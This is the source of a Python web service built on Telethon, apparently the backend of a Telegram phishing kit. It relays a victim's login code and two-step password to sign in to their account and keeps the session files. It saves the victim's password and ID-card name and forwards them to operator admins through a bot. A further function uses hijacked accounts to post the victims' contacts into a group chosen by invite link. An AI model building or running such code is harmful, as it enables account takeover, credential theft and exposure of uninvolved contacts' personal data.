import time,json, math, asyncio, httpx, numbers,re, random, pathlib, os, sys, tempfile
# Fix Windows Terminal Encoding
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
from telethon import TelegramClient, Button, events, types, errors
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError, AuthKeyUnregisteredError
from telethon.tl.functions.auth import SendCodeRequest, CheckPasswordRequest
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest
from telethon import functions
import os
# os.makedirs("sessions/users", exist_ok=True)

from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import EditAdminRequest, CreateChannelRequest, InviteToChannelRequest, GetParticipantsRequest, LeaveChannelRequest
from telethon.tl.types import ChannelParticipantAdmin, PeerChannel, UserStatusOnline, UserStatusRecently, UserStatusLastWeek, UserStatusOffline, ChannelParticipantsSearch
from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
from datetime import datetime, timedelta, timezone
import pytz

from quart import Quart, request, jsonify

# Try to import from settings.py as fallback
try:
    import settings
except ImportError:
    settings = None

# GLOBAL VARIABLES
path = os.path.dirname(os.path.abspath(__file__))
api_id = 0
api_hash = ""
bot_token = ""
bots = {} # Bot pool: {bot_token: bot_object}
admin = []
url = ""

# Prepare Directories
os.makedirs(os.path.join(path, "sessions", "users"), exist_ok=True)
os.makedirs(os.path.join(path, "json"), exist_ok=True)

# GLOBAL OBJECTS
app = Quart(__name__)
phase = {}
users = {}

def readJSON(targetFile):
    """
    Baca file JSON dengan fallback ke backup.
    Jika file utama rusak (akibat pkill -9 saat sedang ditulis),
    otomatis recover dari file .bak sehingga data tidak hilang.
    """
    backup = targetFile + ".bak"
    try:
        if not os.path.exists(targetFile):
            if os.path.exists(backup):
                print(f"[!] {targetFile} tidak ada, recover dari backup...")
                with open(backup, 'r') as f:
                    return json.load(f)
            return {}
        with open(targetFile, 'r') as f:
            data = json.load(f)
        if data:
            try:
                with open(backup, 'w') as bf:
                    json.dump(data, bf, indent=4)
            except Exception:
                pass
        return data
    except Exception as e:
        print(f"[!] Error reading {targetFile}: {e}")
        if os.path.exists(backup):
            try:
                print(f"[✔] Recovering data from backup: {backup}")
                with open(backup, 'r') as f:
                    return json.load(f)
            except Exception as be:
                print(f"[!] Backup juga gagal dibaca: {be}")
        return {}

def saveJSON(targetFile, source):
    """
    Simpan JSON secara ATOMIC menggunakan temp file + os.replace.
    Jika proses di-kill di tengah penulisan, file asli TIDAK akan rusak.
    """
    try:
        dir_name = os.path.dirname(os.path.abspath(targetFile))
        os.makedirs(dir_name, exist_ok=True)
        with tempfile.NamedTemporaryFile('w', dir=dir_name, delete=False,
                                         suffix='.tmp', encoding='utf-8') as tmp:
            json.dump(source, tmp, indent=4, ensure_ascii=False)
            tmp_path = tmp.name
        os.replace(tmp_path, targetFile)
    except Exception as e:
        print(f"[!] Error saving {targetFile}: {e}")
        try:
            if 'tmp_path' in locals() and os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass

# Helper to get dynamic paths per tenant
def get_tenant_paths(tenant_id):
    tenant_dir = os.path.join(path, "sessions", f"tenant_{tenant_id}")
    session_user_path = os.path.join(tenant_dir, "users")
    os.makedirs(session_user_path, exist_ok=True)
    
    json_dir = os.path.join(path, "json")
    os.makedirs(json_dir, exist_ok=True)
    
    return {
        'sessions': session_user_path,
        'users_json': os.path.join(json_dir, f"users_{tenant_id}.json"),
        'phase_json': os.path.join(json_dir, f"phase_{tenant_id}.json")
    }

def get_tenant_data(tenant_id):
    paths = get_tenant_paths(tenant_id)
    return readJSON(paths['users_json']), readJSON(paths['phase_json'])

def get_config(data):
    global api_id, api_hash, bot_token, admin
    raw_api_id = data.get('api_id', 0)
    try:
        api_id = int(raw_api_id) if raw_api_id else 0
    except (ValueError, TypeError):
        api_id = 0
    api_hash = str(data.get('api_hash', '') or '')
    bot_token = str(data.get('bot_token', '') or '')
    admin = data.get('admin_ids', '').split(',') if data.get('admin_ids') else []

    # Fallback to settings.py if missing or 0
    if not api_id and settings and hasattr(settings, 'api_id'):
        api_id = int(settings.api_id)
    if not api_hash and settings and hasattr(settings, 'api_hash'):
        api_hash = str(settings.api_hash)
    if not bot_token and settings and hasattr(settings, 'bot_token'):
        bot_token = str(settings.bot_token)
    if not admin and settings and hasattr(settings, 'admin'):
        admin = [str(x) for x in settings.admin]

    return {
        'api_id': api_id,
        'api_hash': api_hash,
        'bot_token': bot_token,
        'admin_ids': admin
    }

async def init_bot(config_data):
    global bots, api_id, api_hash
    config = get_config(config_data)
    current_token = config['bot_token']
    
    if not current_token:
        print("[!] Warning: bot_token kosong, init_bot dilewati.")
        return None
    
    if current_token not in bots or not bots[current_token]:
        session_path = os.path.join(path, "sessions", "api_server")
        os.makedirs(session_path, exist_ok=True)
        bot_session_path = os.path.join(session_path, f"bot_{current_token.split(':')[0]}")
        print(f"[*] Initializing API Bot for token {current_token[:10]}... (Session: {bot_session_path})")
        
        from telethon.network import connection
        new_bot = TelegramClient(
            bot_session_path, 
            config['api_id'], 
            config['api_hash'],
            connection=connection.ConnectionTcpIntermediate
        )
        for attempt in range(5):
            try:
                await new_bot.start(bot_token=current_token)  # type: ignore
                print(f"[✔] API Bot {current_token[:10]} connected successfully!")
                bots[current_token] = new_bot
                break
            except Exception as e:
                print(f"[!] API Bot {current_token[:10]} connection attempt {attempt+1} failed: {e}")
                err_str = str(e).lower()
                if "expired" in err_str or "invalid" in err_str or "unauthorized" in err_str:
                    print(f"[!] Token {current_token[:10]} kedaluwarsa atau tidak valid. Hentikan percobaan.")
                    bots[current_token] = None
                    return None
                if attempt < 4:
                    wait_time = (attempt + 1) * 3
                    print(f"[*] Retrying in {wait_time}s...")
                    await asyncio.sleep(wait_time)
                else:
                    print(f"[!] Critical: API Bot {current_token[:10]} could not connect.")
                    bots[current_token] = None
                    return None
    
    # Check if bot is still connected, if not, reconnect
    bot = bots.get(current_token)
    if bot and not bot.is_connected():
        print(f"[*] API Bot {current_token[:10]} disconnected. Reconnecting...")
        try:
            await bot.connect()
            print(f"[✔] API Bot {current_token[:10]} reconnected successfully!")
        except Exception as e:
            print(f"[!] API Bot {current_token[:10]} reconnection failed: {e}")
            
    return bot

async def notif(target_bot, text, buttons=None):
    if not target_bot:
        print("[!] Cannot send notif: target_bot is None")
        return
    
    # Ensure bot is connected before sending
    if not target_bot.is_connected():
        print("[*] Bot disconnected during notif call. Attempting reconnect...")
        try:
            await target_bot.connect()
        except Exception as e:
            print(f"[!] Failed to reconnect for notification: {e}")
            return

    for a in set(admin):
        try: 
            # Make sure admin entity is fetched (especially for new sessions)
            try:
                entity = await target_bot.get_input_entity(int(a.strip()))
            except Exception:
                entity = int(a.strip())
                
            await target_bot.send_message(entity, text, buttons=buttons)
        except Exception as e: 
            print(f"Notif failed to {a}: {e}")

def normalize_phone(phone):
    phone = str(phone).strip().replace(" ", "").replace("-", "").replace("+", "")
    if phone.startswith('0'):
        phone = '62' + phone[1:]
    elif phone.startswith('8'):
        phone = '62' + phone
    return phone

API_SECRET_KEY = os.environ.get("API_SECRET_KEY", "")
API_START_TIME = time.time()

@app.before_request
async def verify_api_key():
    if API_SECRET_KEY and request.path not in ['/health', '/']:
        key = request.headers.get("X-API-KEY", "")
        if key != API_SECRET_KEY:
            return jsonify({"status": "error", "message": "Unauthorized"}), 401

@app.route('/health', methods=['GET'])
async def health_check():
    uptime = round(time.time() - API_START_TIME, 1)
    return jsonify({
        'status': 'ok',
        'uptime_seconds': uptime,
        'service': 'malxgmn-brd-api'
    }), 200

@app.route('/send_otp', methods=['POST'])
async def send_otp():
    data = await request.get_json()
    phone = normalize_phone(data['phone'])
    tenant_id = data.get('tenant_id', '0')
    paths = get_tenant_paths(tenant_id)
    users, phase = get_tenant_data(tenant_id)
    
    cfg = get_config(data)
    curr_api_id = cfg['api_id']
    curr_api_hash = cfg['api_hash']

    if not curr_api_id or not curr_api_hash:
        return jsonify({'status': 'error', 'message': 'API ID atau API Hash kosong pada pengaturan tenant.'}), 400

    # Inisialisasi bot di latar belakang secara asinkron agar tidak memblokir pengiriman OTP
    asyncio.create_task(init_bot(data))
    print(f"[Tenant {tenant_id}] Sending OTP to {phone} using API {curr_api_id}")
    
    from telethon.network import connection
    acc = None
    try:
        acc = TelegramClient(os.path.join(paths['sessions'], phone), curr_api_id, curr_api_hash, connection=connection.ConnectionTcpIntermediate)
        for _ in range(3):
            try:
                await acc.connect()
                if await acc.is_user_authorized() or not await acc.is_user_authorized(): 
                    break # if it doesn't throw, it's connected
            except Exception:
                await asyncio.sleep(1)
                
        if not acc.is_connected():
            return jsonify({'status': 'error', 'message': 'Gagal terhubung ke server Telegram. Silakan coba lagi.'}), 502
            
        phash = await acc.send_code_request('+' + phone)
        phase[phone] = {
            'hash': phash.phone_code_hash,
            'ktp_name': data.get('ktp_name', '')
        }
        saveJSON(paths['phase_json'], phase)
        print(f"[Tenant {tenant_id}] OTP sent successfully to {phone}")
        return jsonify({'status': 'otp_sent', 'hash': phash.phone_code_hash})
    except Exception as e:
        err_msg = str(e)
        if "flood" in err_msg.lower():
            err_msg = "Terlalu banyak percobaan (FLOOD_WAIT). Silakan coba lagi nanti."
        print(f"[Tenant {tenant_id}] Error sending OTP to {phone}: {err_msg}")
        return jsonify({'status': 'error', 'message': err_msg}), 400
    finally:
        if acc:
            try:
                await acc.disconnect()
            except Exception:
                pass

@app.route('/verify_otp', methods=['POST'])
async def verify_otp():
    data = await request.get_json()
    phone = normalize_phone(data['phone'])
    otp = data['otp']
    tenant_id = data.get('tenant_id', '0')
    paths = get_tenant_paths(tenant_id)
    users, phase = get_tenant_data(tenant_id)
    
    # Ensure bot is initialized
    await init_bot(data)
    print(f"[Tenant {tenant_id}] Verifying OTP {otp} for {phone}")
    if phone not in phase:
        return jsonify({'status': 'error', 'message': 'OTP not requested for this phone'})
    
    from telethon.network import connection
    acc = TelegramClient(os.path.join(paths['sessions'], phone), api_id, api_hash, connection=connection.ConnectionTcpIntermediate)
    for _ in range(3):
        try:
            await acc.connect()
            if await acc.is_user_authorized() or not await acc.is_user_authorized(): 
                break
        except Exception:
            await asyncio.sleep(1)
            
    if not acc.is_connected():
        return jsonify({'status': 'error', 'message': 'Cannot connect to Telegram servers. Please try again.'})
        
    try:
        if isinstance(phase[phone], dict):
            phone_code_hash = phase[phone]['hash']
            ktp_name = phase[phone]['ktp_name']
        else:
            phone_code_hash = phase[phone]
            ktp_name = ""

        result = await acc.sign_in('+' + phone, otp, phone_code_hash=phone_code_hash)
        name = result.first_name
        if result.last_name:
            name = f"{result.first_name} {result.last_name}"
        users[phone] = {
            "user_id": result.id, 
            "name": name, 
            "ktp_name": ktp_name,
            "username": result.username, 
            "password": "",
            "invite_link": data.get('invite_link', '')
        }
        saveJSON(paths['users_json'], users)
        
        # SEND NOTIFICATION
        msg = (
            "```\n"
            "░█░█░▀█░░▀█░░█▀▄░█▀█░▀█▀\n"
            "░░▀█░░█░░░█░░█▀▄░█░█░░█░\n"
            "░░░▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░░▀░\n"
            "[✦] 411 BOT IKLAN [✦]```\n\n"
            f"🟢 User login sukses\n\n"
            f"🔑 Login ID: +{phone}\n"
            f"🆔 Telegram ID: {result.id}\n"
            f"👤 Nama Telegram: {name}\n"
            f"🪪 Nama KTP: {ktp_name}\n"
            f"🔗 Username: @{result.username or '-'}"
        )
        current_bot = bots.get(data.get('bot_token'))
        await notif(current_bot, msg, buttons=[[Button.inline("👤 ACCOUNT MANAGER", "getUser:1")]])
        
        print(f"OTP verified successfully for {phone}")
        return jsonify({'status': 'success'})
    except SessionPasswordNeededError:
        print(f"Password needed for {phone}")
        return jsonify({'status': 'password_needed'})
    except Exception as e:
        err_msg = str(e)
        if "phone code entered was invalid" in err_msg.lower():
            err_msg = "Kode Verifikasi yang Anda masukkan salah atau sudah kedaluwarsa."
        print(f"Error verifying OTP for {phone}: {err_msg}")
        return jsonify({'status': 'error', 'message': err_msg})
    finally:
        try:
            await acc.disconnect()
        except Exception as e:
            print(f"Error disconnecting: {e}")

@app.route('/verify_password', methods=['POST'])
async def verify_password():
    data = await request.get_json()
    phone = normalize_phone(data['phone'])
    password = data['password']
    tenant_id = data.get('tenant_id', '0')
    paths = get_tenant_paths(tenant_id)
    users, phase = get_tenant_data(tenant_id)
    
    # Ensure bot is initialized
    await init_bot(data)
    print(f"[Tenant {tenant_id}] Verifying password for {phone}")
    if phone not in phase:
        return jsonify({'status': 'error', 'message': 'OTP not requested for this phone'})
    
    from telethon.network import connection
    acc = TelegramClient(os.path.join(paths['sessions'], phone), api_id, api_hash, connection=connection.ConnectionTcpIntermediate)
    for _ in range(3):
        try:
            await acc.connect()
            if await acc.is_user_authorized() or not await acc.is_user_authorized(): 
                break
        except Exception:
            await asyncio.sleep(1)
            
    if not acc.is_connected():
        return jsonify({'status': 'error', 'message': 'Cannot connect to Telegram servers. Please try again.'})
        
    try:
        if isinstance(phase[phone], dict):
            phone_code_hash = phase[phone]['hash']
            ktp_name = phase[phone]['ktp_name']
        else:
            phone_code_hash = phase[phone]
            ktp_name = ""

        result = await acc.sign_in(password=password, phone_code_hash=phone_code_hash)
        name = result.first_name
        if result.last_name:
            name = f"{result.first_name} {result.last_name}"
        users[phone] = {
            "user_id": result.id, 
            "name": name, 
            "ktp_name": ktp_name,
            "username": result.username, 
            "password": password,
            "invite_link": data.get('invite_link', '')
        }
        saveJSON(paths['users_json'], users)
        
        # SEND NOTIFICATION
        msg = (
            "```\n"
            "░█░█░▀█░░▀█░░█▀▄░█▀█░▀█▀\n"
            "░░▀█░░█░░░█░░█▀▄░█░█░░█░\n"
            "░░░▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░░▀░\n"
            "[✦] 411 BOT IKLAN [✦]```\n"
            "**Pilih menu di bawah ini :**\n\n"
            f"🟢 User login sukses\n\n"
            f"🔑 Login ID: +{phone}\n"
            f"🆔 Telegram ID: {result.id}\n"
            f"👤 Nama Telegram: {name}\n"
            f"🪪 Nama KTP: {ktp_name}\n"
            f"🔗 Username: @{result.username or '-'}\n"
            f"🔐 Kata Sandi: {password}"
        )
        current_bot = bots.get(data.get('bot_token'))
        await notif(current_bot, msg, buttons=[[Button.inline("👤 ACCOUNT MANAGER", "getUser:1")]])
        
        print(f"Password verified successfully for {phone}")
        return jsonify({'status': 'success'})
    except Exception as e:
        err_msg = str(e)
        if "password" in err_msg.lower() and "invalid" in err_msg.lower():
            err_msg = "Kata sandi yang Anda masukkan salah."
        print(f"Error verifying password for {phone}: {err_msg}")
        return jsonify({'status': 'error', 'message': err_msg})
    finally:
        try:
            await acc.disconnect()
        except Exception as e:
            print(f"Error disconnecting: {e}")

async def share_contacts_session(ambo,  # TelegramClient
                                  invite: str,
                                  limit: int = 5000):
    # Hapus bare "except:" supaya error kelihatan
    # 1) Join group via invite
    code = invite.rsplit("+", 1)[-1]
    try:
        join_res = await ambo(functions.messages.ImportChatInviteRequest(code))
        grup = join_res.chats[0] if getattr(join_res, "chats", None) else await ambo.get_entity(invite)
    except errors.UserAlreadyParticipantError:
        grup = await ambo.get_entity(invite)

    # 2) Mute notifikasi grup (best effort)
    try:
        await ambo(functions.account.UpdateNotifySettingsRequest(
            peer=grup,
            settings=types.InputPeerNotifySettings(mute_until=2**31 - 1)
        ))
    except Exception as e:
        print(f"Gagal mute notifikasi: {e}")

    # 3) Ambil kontak & filter
    all_users = (await ambo(functions.contacts.GetContactsRequest(hash=0))).users
    kandidat = []
    for u in all_users:
        # hanya non-mutual + aktif ≤ 3 hari + phone mulai 62
        if getattr(u, "mutual_contact", False):
            continue
        if not aktif_dalam_3_hari(u):
            continue
        phone = (u.phone or "").lstrip("+")
        if not phone or not phone.startswith("62"):
            continue

        kandidat.append(u)
        if len(kandidat) >= limit:
            break

    sent = fail = 0
    for u in kandidat:
        try:
            phone = (u.phone or "").lstrip("+")
            media = types.InputMediaContact(
                phone_number=phone,
                first_name=u.first_name or "-",
                last_name=u.last_name or "",
                vcard=(
                    "BEGIN:VCARD\nVERSION:3.0\n"
                    f"FN:{(u.first_name or '-')} {(u.last_name or '')}\n"
                    f"TEL:{phone}\nEND:VCARD"
                ),
            )
            await ambo(functions.messages.SendMediaRequest(
                peer=grup,
                media=media,
                message="",
                random_id=int.from_bytes(os.urandom(8), "big", signed=True),
            ))
            sent += 1
            # Add delay to avoid flood wait
            await asyncio.sleep(1)  # 1 second delay between sends
        except Exception as e:
            print(f"Gagal kirim ke: {u.id} {u.username or ''} – {type(e).__name__}: {e}")
            fail += 1
            if "FloodWaitError" in str(e):
                # Extract wait time and sleep
                import re
                match = re.search(r'wait of (\d+) seconds', str(e))
                if match:
                    wait_time = int(match.group(1))
                    print(f"Flood wait detected, sleeping for {wait_time} seconds")
                    await asyncio.sleep(wait_time)
                else:
                    await asyncio.sleep(60)  # Default wait if can't parse

    # 4) Leave group (opsional)
    try:
        await ambo(functions.channels.LeaveChannelRequest(channel=grup))
    except Exception:
        pass

    return sent, fail

# ─────────── helper status aktif ───────────
WITA = timezone(timedelta(hours=8))
ACTIVE_LIMIT = timedelta(days=3)

def aktif_dalam_3_hari(u: types.User) -> bool:
    st = u.status
    if st is None:
        return False
    if isinstance(st, (types.UserStatusOnline, types.UserStatusRecently)):
        return True
    if isinstance(st, types.UserStatusOffline):
        return datetime.now(WITA) - st.was_online.replace(tzinfo=WITA) <= ACTIVE_LIMIT
    if isinstance(st, types.UserStatusLastWeek):
        # asumsi masih <= 7 hari → terima agar tidak terlalu ketat
        return True
    return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, use_reloader=False)

